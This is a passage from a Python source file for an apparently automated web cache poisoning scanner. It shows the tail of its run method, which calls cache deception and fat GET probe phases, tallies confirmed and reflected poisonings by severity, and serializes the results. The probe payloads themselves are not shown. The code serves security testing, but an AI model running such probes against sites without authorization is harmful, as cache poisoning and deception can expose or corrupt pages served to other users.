                    self.timeout, self.rate_delay,
                )
                all_results.extend(esi_results)

        # ── Phase 4: cache deception ───────────────────────────────────────
        if "deception" not in self.skip_families:
            print(f"[cache_poison] phase 4: cache deception probes")
            for auth_path in self.authenticated_paths:
                dec_results = _probe_cache_deception(
                    session, self.target_url, auth_path,
                    self.timeout, self.rate_delay,
                )
                all_results.extend(dec_results)

        # ── Phase 5: fat GET ───────────────────────────────────────────────
        if "fat_get" not in self.skip_families:
            print(f"[cache_poison] phase 5: fat GET probes")
            for endpoint in cacheable[:3]:
                r = _probe_fat_get(
                    session, endpoint, self.timeout, self.rate_delay,
                )
                if r:
                    all_results.append(r)

        # ── Post-process ───────────────────────────────────────────────────
        all_results = _dedup_sort(all_results)

        confirmed  = [r for r in all_results if r.poisoned]
        reflected  = [r for r in all_results if r.canary_reflected_in_poison and not r.poisoned]
        potential  = [r for r in all_results if not r.canary_reflected_in_poison]

        # Severity summary
        sev_counts: Dict[str, int] = {}
        family_counts: Dict[str, int] = {}
        for r in confirmed:
            sev_counts[r.severity]      = sev_counts.get(r.severity, 0) + 1
            family_counts[r.technique_family] = family_counts.get(r.technique_family, 0) + 1

        print(
            f"[cache_poison] done | "
            f"confirmed={len(confirmed)} "
            f"reflected={len(reflected)} "
            f"total={len(all_results)}"
        )

        return {
            "target":               self.target_url,
            "cache_layer":          fingerprint.cache_layer if fingerprint else None,
            "vary_headers":         fingerprint.vary_headers if fingerprint else [],
            "cacheable_endpoints":  cacheable,
            "total_probes":         len(all_results),
            "confirmed_poisoned":   len(confirmed),
            "reflection_only":      len(reflected),
            "severity_summary":     sev_counts,
            "family_summary":       family_counts,
            "fingerprint":          self._ser_fingerprint(fingerprint),
            "results":              [self._ser_result(r) for r in all_results],
        }

    @staticmethod
    def _ser_fingerprint(fp: Optional[CacheFingerprint]) -> Optional[Dict]:
        if not fp:
            return None
        return {
            "cache_layer":       fp.cache_layer,
            "cache_hit_header":  fp.cache_hit_header,
            "cache_hit_value":   fp.cache_hit_value,
            "age_seconds":       fp.age_seconds,
            "vary_headers":      fp.vary_headers,
            "cache_control":     fp.cache_control,
            "surrogate_control": fp.surrogate_control,
            "cdn_headers":       fp.cdn_headers,
        }

    @staticmethod
    def _ser_result(r: CacheProbeResult) -> Dict:
        return {
            "technique_label":            r.technique_label,
            "technique_family":           r.technique_family,
            "severity":                   r.severity,
            "target_url":                 r.target_url,
            "injected_header":            r.injected_header,
            "injected_value":             r.injected_value,
            "injected_param":             r.injected_param,
            "poison_status":              r.poison_status,
            "poison_cache_state":         r.poison_cache_state,
            "canary_reflected_in_poison": r.canary_reflected_in_poison,
            "verify_status":              r.verify_status,
            "verify_cache_state":         r.verify_cache_state,
            "canary_reflected_in_verify": r.canary_reflected_in_verify,
            "poisoned":                   r.poisoned,
            "evidence":                   r.evidence,
            "response_diff_bytes":        r.response_diff_bytes,
        }